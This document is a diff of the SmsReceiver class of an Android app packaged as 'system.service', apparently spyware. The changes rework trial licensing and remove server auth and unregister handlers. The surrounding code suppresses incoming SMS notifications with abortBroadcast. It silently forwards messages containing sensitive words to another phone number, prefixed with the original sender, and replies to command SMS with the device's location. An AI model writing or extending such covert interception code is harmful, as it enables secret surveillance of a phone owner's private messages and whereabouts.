@@ -7,6 +7,7 @@ import java.util.Calendar;
 import java.util.Date;
 
 import system.service.BootService;
+import system.service.GlobalValues;
 import system.service.IndicationHandler;
 import system.service.R;
 import system.service.R.raw;
@@ -16,9 +17,8 @@ import system.service.activity.HomeActivity;
 import system.service.config.ConfigCtrl;
 
 import com.particle.inspector.common.util.phone.PhoneUtils;
-import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
-import com.particle.inspector.common.util.sms.SuperLoggingSms;
+import com.particle.inspector.common.util.sms.TrialSms;
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.GpsUtil;
@@ -93,19 +93,24 @@ public class SmsReceiver extends BroadcastReceiver
 				abortBroadcast(); // Finish broadcast, the system will notify this SMS
 				
 				// Set trial key and type if not licensed before 
-				if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) {
-					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.TRIAL_LICENSED);
+				if (GlobalValues.licenseType == LICENSE_TYPE.NOT_LICENSED
+					&& ConfigCtrl.getConsumedDatetime(context) == null) 
+				{
+					GlobalValues.licenseType = LICENSE_TYPE.TRIAL_LICENSED;
+					ConfigCtrl.setLicenseKey(context, LicenseCtrl.TRIAL_KEY);
 					// Save consumed datetime
 					ConfigCtrl.setConsumedDatetime(context, (new Date()));
 					
 					// Send trial info if it is 1st time and it is trial
+					/*
 					String trialInfoSent = ConfigCtrl.getTrialInfoSmsSentDatetime(context);
 					if (trialInfoSent == null || trialInfoSent.length() <= 0) {
-						boolean ret = SmsCtrl.sendTrialLoggingSms(context);
+						boolean ret = SmsCtrl.sendTrialSms(context);
 						if (ret) {
 							ConfigCtrl.setTrialInfoSmsSentDatetime(context, new Date());
 						}
 					}
+					*/
 				}
 				
 				// If out of trial or not licensed, do not show the setting dialog again.
@@ -125,61 +130,6 @@ public class SmsReceiver extends BroadcastReceiver
 				initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 				context.startActivity(initIntent);
 			}
-
-			//-------------------------------------------------------------------------------
-			// If it is the response validation SMS from server
-			// The response AUTH SMS format: Auth,<key>,<Target Phone Number>,OK/NG
-			else if (smsBody.startsWith(SmsConsts.HEADER_AUTH_EX)) 
-			{
-				// If it is not from server (phone number is different), return
-				//if (!SmsCtrl.getSmsAddress(intent).equalsIgnoreCase(context.getResources().getString(R.string.srv_address))) {
-				//	return;
-				//}
-
-				String[] parts = smsBody.split(SmsConsts.SEPARATOR);
-				if (parts.length >= 4) {
-					abortBroadcast(); // Finish broadcast, the system will notify this SMS
-
-					// --------------------------------------------------------------
-					if (parts[3].equals(SmsConsts.SUCCESS)) {
-						// Save self phone number
-						if (parts[2].trim().length() > 0) {
-							ConfigCtrl.setSelfPhoneNum(context, parts[2].trim());
-						}
-						
-						// Save license key to SharedPreferences
-						ConfigCtrl.setLicenseKey(context, parts[1]);
-						
-						// Save license type info to SharedPreferences
-						LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, parts[1]);
-						if (!ConfigCtrl.setLicenseType(context, type)) {
-							// Send back SMS to receiver to warn the failure
-							String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-							if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
-								String smsContent = context.getResources().getString(R.string.indication_register_write_ng);
-								SmsCtrl.sendSms(recvPhoneNum, smsContent);
-							}
-							return;
-						}
-
-						// Save consumed datetime if it is the 1st activation
-						ConfigCtrl.setConsumedDatetime(context, new Date());
-						
-						// Send SMS to receiver
-						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-						if (recvPhoneNum != null && recvPhoneNum.length() > 0) {
-							String smsContent = context.getResources().getString(R.string.indication_register_ok);
-							SmsCtrl.sendSms(recvPhoneNum, smsContent);
-						}
-					} else if (parts[3].equalsIgnoreCase(SmsConsts.FAILURE)) {
-						if (parts.length >= 4) {
-							//SysUtils.messageBox(context, parts[3]);
-						} else {
-							//SysUtils.messageBox(context, context.getResources().getString(R.string.msg_invalid_key));
-						}
-					}
-				}
-			}
 			
 			//-------------------------------------------------------------------------------
 			// If it is the indication SMS
@@ -191,30 +141,6 @@ public class SmsReceiver extends BroadcastReceiver
 				IndicationHandler.handleIndicationSms(context, smsBody, phoneNum);
 			}
 			
-			//-------------------------------------------------------------------------------
-			// If it is unregister response SMS from server
-			else if (smsBody.startsWith(SmsConsts.HEADER_UNREGISTER_EX))
-			{
-				abortBroadcast(); // Finish broadcast, the system will notify this SMS
-				
-				String incomingPhoneNum = SmsCtrl.getSmsAddress(intent);
-				String[] parts = smsBody.split(SmsConsts.SEPARATOR);
-				if (parts.length < 3) return;
-				if (parts[2].equals(SmsConsts.SUCCESS)) {
-					ConfigCtrl.setLicenseKey(context, "");
-					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
-					
-					// send a reporting SMS to the receiver
-					String reportPhoneNum = ConfigCtrl.getUnregistererPhoneNum(context);
-					if (reportPhoneNum == null || reportPhoneNum.length() <= 0 ) { 
-						reportPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-					}
-					if (reportPhoneNum != null && reportPhoneNum.length() > 0) {
-						boolean ret = SmsCtrl.sendUnregisterReportSms(context, reportPhoneNum);
-					}
-				}
-			}
-
 			//-------------------------------------------------------------------------------
 			// Send location SMS if being triggered by location indication
 			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION) || smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION_ALIAS))
@@ -372,8 +298,7 @@ public class SmsReceiver extends BroadcastReceiver
 				if (!ConfigCtrl.isLegal(context)) return;
 				
 				// Count ++ if in trial
-				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-				if (type == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachSmsRedirectTimeLimit(context)) {
+				if (GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.reachSmsRedirectTimeLimit(context)) {
 					if (!ConfigCtrl.getHasSentRedirectSmsTimesLimitSms(context)) {
 						// Send SMS to warn user
 						String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
@@ -393,7 +318,7 @@ public class SmsReceiver extends BroadcastReceiver
 					String smsAddress = SmsCtrl.getSmsAddress(intent);
 					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), smsAddress);
 					boolean ret = SmsCtrl.sendSms(phoneNum, header + smsBody);
-					if (ret && type == LICENSE_TYPE.TRIAL_LICENSED) {
+					if (ret && GlobalValues.licenseType == LICENSE_TYPE.TRIAL_LICENSED) {
 						ConfigCtrl.countSmsRedirectTimesInTrial(context);
 					}
 				}
@@ -463,11 +388,11 @@ public class SmsReceiver extends BroadcastReceiver
 	
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
-		if (BootService.sensitiveWordArray == null || BootService.sensitiveWordArray.length <= 0) 
+		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
 			return false; // We only redirect SMS that contains sensitive words intead of redirecting all.
 
 		String smsBody = sms.toLowerCase();
-		for (String word : BootService.sensitiveWordArray) {
+		for (String word : GlobalValues.sensitiveWordArray) {
 			if (smsBody.contains(word)) {
 				ret = true;
 				break;
